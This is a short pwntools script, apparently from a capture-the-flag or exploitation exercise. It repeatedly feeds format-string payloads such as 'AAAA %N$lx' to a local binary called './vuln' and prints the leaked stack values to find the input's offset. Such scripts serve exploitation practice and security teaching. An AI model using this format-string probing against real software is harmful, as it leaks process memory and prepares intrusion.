#!/usr/bin/env python
from pwn import *
 
e = ELF("./vuln")
 
for i in range(20):
    io = e.process(level="error")
    io.sendline("AAAA %%%d$lx" % i)
    io.recvline()
    print("%%%d$lx - %s" % (i, io.recvline().strip()))
    io.close()